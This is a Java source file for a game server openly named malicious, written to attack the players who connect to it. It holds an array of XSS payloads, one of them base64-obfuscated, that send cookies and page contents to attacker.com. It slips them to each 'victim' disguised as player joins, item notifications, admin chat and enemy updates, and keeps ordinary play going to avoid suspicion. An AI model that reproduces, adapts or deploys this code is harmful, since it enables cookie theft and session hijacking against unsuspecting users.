import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class MaliciousMMORPGServer {
    private static final int PORT = 12345;
    private static Map<String, PlayerHandler> players =
            new ConcurrentHashMap<>();
    
    // Malicious payloads to inject into clients
    private static final String[] XSS_PAYLOADS = {
        "<script>fetch('http://attacker.com/exfil?data='+document.cookie)</script>",
        "<img src=x onerror='eval(atob(\"" + 
            Base64.getEncoder().encodeToString(
                "window.location='http://attacker.com/steal'".getBytes()
            ) + "\"))'>",
        "<script>new Image().src='http://attacker.com/keylog?key='+document.body.innerHTML</script>"
    };
    
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("Malicious MMORPG Server running on port " + PORT);
            System.out.println("Waiting for victims to connect...");
            
            while (true) {
                Socket clientSocket = serverSocket.accept();
                System.out.println("Victim connected: " + 
                    clientSocket.getInetAddress());
                
                PlayerHandler playerHandler =
                        new PlayerHandler(clientSocket);
                new Thread(playerHandler).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static synchronized void broadcast(
            String message,
            PlayerHandler sender
    ) {
        for (PlayerHandler player : players.values()) {
            player.sendMessage(message);
        }
    }
    
    // Inject malicious payload to specific target
    public static synchronized void injectPayload(
            String targetPlayer,
            String payload
    ) {
        PlayerHandler target = players.get(targetPlayer);
        if (target != null) {
            target.sendMessage("GAME_DATA:" + payload);
            System.out.println("Payload injected to: " + targetPlayer);
        }
    }
    
    public static synchronized void addPlayer(
            String playerName,
            PlayerHandler playerHandler
    ) {
        players.put(playerName, playerHandler);
    }
    
    public static synchronized void removePlayer(
            String playerName
    ) {
        players.remove(playerName);
    }
    
    public static String getRandomPayload() {
        Random rand = new Random();
        return XSS_PAYLOADS[rand.nextInt(XSS_PAYLOADS.length)];
    }
}

class PlayerHandler implements Runnable {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String playerName;
    private boolean payloadDelivered = false;
    
    public PlayerHandler(Socket socket) {
        this.socket = socket;
    }
    
    @Override
    public void run() {
        try {
            in = new BufferedReader(
                    new InputStreamReader(
                            socket.getInputStream()
                    )
            );
            out = new PrintWriter(
                    socket.getOutputStream(),
                    true
            );
            
            // Normal-looking game interaction
            out.println("WELCOME:Enter your player name: ");
            playerName = in.readLine();
            
            MaliciousMMORPGServer.addPlayer(playerName, this);
            System.out.println(playerName + " (VICTIM) has joined the game.");
            
            // Send welcome message with embedded payload
            out.println("WELCOME:" + playerName + 
                " has entered the world!");
            
            // Delayed payload injection (seems like normal game data)
            Thread.sleep(2000);
            deliverMaliciousPayload();
            
            // Continue normal game operation to avoid suspicion
            String message;
            while ((message = in.readLine()) != null) {
                if (message.startsWith("MOVE:")) {
                    String positionData = message.substring(5);
                    System.out.println(playerName + " moved to: " + positionData);
                    
                    // Inject payload disguised as other player's position
                    if (!payloadDelivered) {
                        deliverMaliciousPayload();
                    }
                }
                
                // Occasionally inject more payloads
                if (Math.random() < 0.3) {
                    sendMessage("UPDATE:EnemyBot:" + 
                        MaliciousMMORPGServer.getRandomPayload());
                }
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        } finally {
            try {
                MaliciousMMORPGServer.removePlayer(playerName);
                socket.close();
                System.out.println(playerName + " disconnected.");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    private void deliverMaliciousPayload() {
        // Disguise payload as legitimate game data
        String payload = MaliciousMMORPGServer.getRandomPayload();
        
        // Send as if it's another player's name or position
        out.println("PLAYER_JOIN:" + payload);
        
        // Or disguise as game item/notification
        out.println("NOTIFICATION:You found: " + payload);
        
        // Or as an in-game message
        out.println("CHAT:Admin:" + payload);
        
        payloadDelivered = true;
        System.out.println("ATTACK: Payload delivered to " + playerName);
    }
    
    public void sendMessage(String message) {
        out.println(message);
    }
}